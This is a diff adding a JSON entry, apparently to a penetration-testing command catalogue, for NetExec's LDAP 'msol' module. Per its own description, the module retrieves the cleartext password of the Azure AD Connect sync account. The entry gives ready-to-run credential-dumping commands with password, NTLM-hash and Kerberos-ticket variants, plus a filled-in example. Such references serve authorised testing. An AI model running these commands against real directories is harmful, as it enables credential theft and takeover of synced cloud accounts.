@@ -1,0 +1,36 @@
+{
+  "id": "nxc-ldap-msol",
+  "name": "NetExec LDAP MSOL Account",
+  "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M msol",
+  "description": "Retrieve the cleartext password of the MSOL (Azure AD Connect) sync account",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "nxc",
+    "ldap",
+    "msol",
+    "azure-ad-connect",
+    "credential-dumping",
+    "sync-account"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M msol"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M msol"
+    }
+  ],
+  "examples": [
+    "nxc ldap '192.168.1.100' -u 'admin' -p 'password' -M msol"
+  ]
+}
